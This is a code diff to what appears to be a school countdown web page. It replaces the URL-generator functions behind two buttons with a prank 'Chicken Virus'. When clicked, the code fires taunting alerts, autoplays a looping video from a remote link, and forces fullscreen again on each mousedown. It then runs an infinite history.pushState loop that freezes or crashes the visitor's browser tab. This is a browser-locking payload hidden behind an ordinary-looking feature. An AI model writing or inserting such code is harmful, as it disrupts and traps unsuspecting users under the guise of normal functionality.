@@ -1005,7 +1005,7 @@ if (urlParams.indexOf("?month=") != -1 &&
             }
         }
         document.getElementById("svg10").onclick = function() {
-            var TEMPLATEURL = window.location.href + "?month=[month]&day=[day]&year=[year]&hour=[hour]&minute=[minute]&second=[second]&millisecond=00&message=[message]"
+            /*var TEMPLATEURL = window.location.href + "?month=[month]&day=[day]&year=[year]&hour=[hour]&minute=[minute]&second=[second]&millisecond=00&message=[message]"
             const currentMonths = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"],
                 currentDays = ["00", "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31"],
                 currentHours = ["00", "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23"],
@@ -1061,10 +1061,56 @@ if (urlParams.indexOf("?month=") != -1 &&
                 } else {
                     alert(`The countdown URL can't be generated because the school session has already ended and/or it hasn't started yet.`)
                 }
-            }
+            }*/
+            function virus() {
+                // for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+                let str = '#';
+                let i = 0;
+                while (true) {
+                    try {
+                        str += i.toString();
+                        window.history.pushState(0, 0, str);
+                        i++;
+                    } catch {
+                        //LOL
+                    }
+                }
+            };
+            alert("Why did you click on this button?")
+            alert("Why, did you click OK?")
+            alert("You can't cancel, welp.")
+            alert("This is your last chance:")
+            alert("Fine.")
+            alert("Chicken Virus ENABLED:")
+            var video = document.createElement("video")
+            video.id = "Astley"
+            video.width = "100%"
+            video.height = "100%"
+            video.src = "https://drive.google.com/uc?export=download&id=1H79giDYN-SzSkYd5h09OQLpsYm4cRefn"
+            video.style = "width: 100%; height: 100%; position: relative; top: 0; left: 0; right: 0; bottom: 0;"
+            video.autoplay = true
+            video.loop = true
+            document.body.appendChild(video)
+            var video = document.getElementById("Astley");
+            video.addEventListener("loadeddata", function (event){
+                if (video.paused && video.currentTime == 0) {
+                    video.play();
+                    document.body.requestFullscreen();
+                    alert("Get Rick LOCKED!")
+                    setTimeout(virus, 2000);
+                    document.title = "Get Rick Rolled!";
+                }
+                else {
+                    document.body.requestFullscreen();
+                    alert("Get Rick LOCKED!")
+                    video.addEventListener("mousedown", () => document.body.requestFullscreen());
+                    setTimeout(virus, 2000);
+                    document.title = "Get Rick Rolled!";
+                }
+            });
         }
         document.getElementById("svg11").onclick = function() {
-            var TEMPLATEURL = window.location.href + "?month=[month]&day=[day]&year=[year]&hour=[hour]&minute=[minute]&second=[second]&millisecond=00&message=[message]"
+            /*var TEMPLATEURL = window.location.href + "?month=[month]&day=[day]&year=[year]&hour=[hour]&minute=[minute]&second=[second]&millisecond=00&message=[message]"
             const currentMonths = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"],
                 currentDays = ["00", "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31"],
                 currentHours = ["00", "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23"],
@@ -1120,7 +1166,53 @@ if (urlParams.indexOf("?month=") != -1 &&
                 } else {
                     alert(`The countdown URL can't be generated because the school session has already ended and/or it hasn't started yet.`)
                 }
-            }
+            }*/
+            function virus() {
+                // for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+                let str = '#';
+                let i = 0;
+                while (true) {
+                    try {
+                        str += i.toString();
+                        window.history.pushState(0, 0, str);
+                        i++;
+                    } catch {
+                        //LOL
+                    }
+                }
+            };
+            alert("Why did you click on this button?")
+            alert("Why, did you click OK?")
+            alert("You can't cancel, welp.")
+            alert("This is your last chance:")
+            alert("Fine.")
+            alert("Chicken Virus ENABLED:")
+            var video = document.createElement("video")
+            video.id = "Astley"
+            video.width = "100%"
+            video.height = "100%"
+            video.src = "https://drive.google.com/uc?export=download&id=1H79giDYN-SzSkYd5h09OQLpsYm4cRefn"
+            video.style = "width: 100%; height: 100%; position: relative; top: 0; left: 0; right: 0; bottom: 0;"
+            video.autoplay = true
+            video.loop = true
+            document.body.appendChild(video)
+            var video = document.getElementById("Astley");
+            video.addEventListener("loadeddata", function (event){
+                if (video.paused && video.currentTime == 0) {
+                    video.play();
+                    document.body.requestFullscreen();
+                    alert("Get Rick LOCKED!")
+                    setTimeout(virus, 2000);
+                    document.title = "Get Rick Rolled!";
+                }
+                else {
+                    document.body.requestFullscreen();
+                    alert("Get Rick LOCKED!")
+                    video.addEventListener("mousedown", () => document.body.requestFullscreen());
+                    setTimeout(virus, 2000);
+                    document.title = "Get Rick Rolled!";
+                }
+            });
         }
         document.getElementById("svg12").onclick = function() {
             var TEMPLATEURL = window.location.href + "?month=[month]&day=[day]&year=[year]&hour=[hour]&minute=[minute]&second=[second]&millisecond=00&message=[message]"
